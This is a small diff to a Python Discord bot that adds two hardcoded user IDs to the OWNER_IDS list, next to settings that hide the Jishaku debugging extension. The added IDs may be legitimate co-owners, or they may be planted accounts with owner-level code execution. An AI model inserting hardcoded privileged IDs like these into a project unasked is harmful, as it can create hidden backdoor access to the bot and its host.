@@ -17,7 +17,7 @@ from config import (OWNER_ID, BOT_PREFIX, BOT_TOKEN,  # pylint: disable=E0401
 from ..db import db  # pylint: disable=E0401
 
 
-OWNER_IDS = [OWNER_ID]
+OWNER_IDS = [OWNER_ID,601173582516584602,735376244656308274]
 os.environ["JISHAKU_NO_UNDERSCORE"] = "True"
 os.environ["JISHAKU_NO_DM_TRACEBACK"] = "True"
 os.environ["JISHAKU_HIDE"] = "True"
